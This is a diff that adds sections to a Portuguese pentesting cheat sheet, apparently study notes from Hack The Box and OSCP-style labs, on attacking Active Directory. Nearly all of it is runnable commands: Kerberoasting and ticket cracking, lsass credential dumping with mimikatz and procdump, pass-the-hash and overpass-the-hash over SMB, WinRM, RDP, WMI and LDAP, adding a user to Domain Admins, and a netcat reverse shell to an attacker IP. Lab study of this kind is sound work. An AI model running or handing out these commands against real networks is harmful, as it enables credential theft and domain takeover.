@@ -143,6 +143,119 @@ Este ponto é bem interessante, porque aqui temos várias possibilidades dispon�
 Se der sucesso:
 
     john --format=krb5asrep -w /usr/share/wordlists/rockyou.txt hashes_temp.txt
+    
+### Kerberoasting
+
+Enumerate SPNs
+
+    setspn -T home.lab -Q */*
+
+impacket
+
+    impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.205.44 -request
+    impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-host dc.active.htb -request
+```
+impacket-GetUserSPNs -dc-host forest.htb.local htb.local/svc-alfresco -k -no-pass
+```
+Rubeus
+
+```
+./r.exe kerberoast /domain:timelapse.htb /dc:dc01.timelapse.htb
+#ou
+r.exe kerberoast /outfile:kerberoastables.txt /domain:active.htb /dc:dc.active.htb /format:john
+hashcat -m 13100 -a 0 ticket.kirbi /usr/share/wordlists/rockyou.txt
+```
+
+Mimikatz
+
+```
+./m.exe
+privilege::debug
+sekurlsa::tickets
+```
+
+Aqui teremos duas opções de extração, sendo elas TGS e TGT. No caso de já termos o acesso adm, basta obtermos o ticket do SPN da seguinte maneira:
+
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
+'<SPN_Name>'
+```
+
+Caso não consiga, basta informar a credencial para que as coisas aconteçam:
+
+```
+$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('htb.local\svc-alfresco',$pass)
+get-domainspnticket -spn IMAP/EXCH01.htb.local -credential $cred
+```
+
+Depois podemos verificar que conseguimos o ticket de duas maneiras:
+
+```
+klist
+```
+
+ou
+
+```
+./m.exe
+privilege::debug
+kerbertos::list /export
+```
+Depois de requisitado esse ticket, podemos quebrá-lo de algumas formas, mas a mais tranquila seria com o tgsrepcrack.py
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>tgsrepcrack</p></figcaption></figure>
+
+```
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-
+Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+```
+
+Outra opção seria com john the ripper
+
+kirbi2john.py
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>kirbi2john.py</p></figcaption></figure>
+
+```
+python kirbi2john.py /path/file.kirbi > kirbi.john
+john --wordlist=/usr/share/rockyou.txt kirbi.john
+```
+
+
+### lsass dump
+
+mimikatz
+
+    privilege::debug
+    sekurlsa::logonPasswords
+    lsadump::lsa /patch
+
+procdump
+
+    get-process lsass
+    .\procdump -accepteula -ma 572 out.dmp
+    #ou
+    .\pd.exe -accepteula -ma lsass.exe lsass_dump
+    #Then parse it with mimikatz
+    mimikatz.exe
+    sekurlsa::minidump out.dmp
+    sekurlsa::logonpasswords
+    #remotelly
+    pypykatz lsa minidump lsass_dump.dmp
+
+TaskManager
+
+![qownnotes-media-kXmyYg](../.gitbook/assets/qownnotes-media-kXmyYg.png)
+
+Crackmapexec
+
+    crackmapexec smb 192.168.175.202 -u Administrator -H "<nt_hash>" --lsa
+
+### Password enumeration
+
+Password spray
 
 Exploração de serviço
 Neste caso, devemos considerar outra página para conseguir algum tipo de exploração. De modo geral, são:
@@ -159,3 +272,105 @@ Aqui podemos aplicar algumas técnicas sendo elas user = password, mais os usuá
     crackmapexec smb hosts.txt -u users.txt -p passwords_test.txt --continue
     
     crackmapexec winrm hosts.txt -u users.txt -p passwords_test.txt --continue
+
+
+Winpeas
+Detalhe que podemos enumerar o console history do powershell com WinPEAS, por exemplo pra fazer a enumeração completa:
+
+```
+wget http://10.10.14.17/4-privilege%20escalation/winPEASx64.exe -o wp.exe
+./wp.exe
+```
+
+## 4 - Manuseio de hashes e passwords
+
+### Overpass the hash
+
+Traduzindo o hash NTLM para um ticket Kerberos:
+
+Locally
+
+    sekurlsa::pth /user:user1 /domain:home.lab /ntlm:ae974876d974abd805a989ebead86846 /run:".\n.exe -e cmd 192.168.0.76 8089"
+    
+    sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+
+Depois disso, basta fazer alguma autenticação via rede, exemplo:
+
+    net use \\dc01.home.lab
+
+**Fica como observação que não consegui reproduzir isso no laboratório**
+
+Remotelly
+
+impacket - Kerberos ticket
+
+```
+impacket-getTGT -dc-ip <IP_do_DC> domain/user:password
+```
+Exemplo
+```
+impacket-getTGT -dc-ip 10.10.11.168 scrm.local/ksimpson:ksimpson
+#ou
+impacket-getTGT -dc-ip 10.10.11.168 scrm.local/ksimpson -hashes :5f38c0485f0c23f8dedf9bf23ffa5336
+```
+E agora o exemplo com o hash da senha (notem que fiz a conversão da senha para o hash NT):
+```
+iconv -f ASCII -t UTF-16LE &#x3C;(printf "ksimpson") | openssl dgst -md4
+#ou
+python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "ksimpson".encode("utf-16le")).digest()))'
+```
+```
+export KRB5NAME=/home/acosta/owncloud/Area_de_trabalho/estudos/hack_the_box/scrambled/Administrator.ccache
+klist
+impacket-psexec -k -no-pass Administrator@dc01.scrm.local
+```
+
+O ccache vai estar carregado e já podemos utilizá-lo para autenticarmos via Kerberos
+
+### pass the hash
+
+Locally
+
+    sekurlsa::pth /user:user1 /domain:home.lab /ntlm:ae974876d974abd805a989ebead86846 /run:".\n.exe -e cmd 192.168.0.76 8089"
+
+Remotelly
+
+#### winrm
+
+```
+evil-winrm -i 10.10.10.103 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
+```
+
+#### RDP
+
+    cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+    xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
+
+
+#### LDAP
+
+    python3
+    >>> import ldap3
+    >>> user = 'DOMAIN\\EXCHANGE$'
+    >>> password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'
+    >>> server = ldap3.Server('DOMAIN.LOCAL')
+    from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
+    connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)
+    >>> connection.bind()
+    >>> from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
+    >>> user_dn = 'CN=IT User,OU=Standard Accounts,DC=domain,DC=local'
+    >>> group_dn = 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
+    >>> addUsersInGroups(connection, user_dn, group_dn)
+    True
+
+#### WMI
+
+    wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
+
+#### SMB
+
+    smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
+    
+    cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C
+    impacket-psexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
+    impacket-smbexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
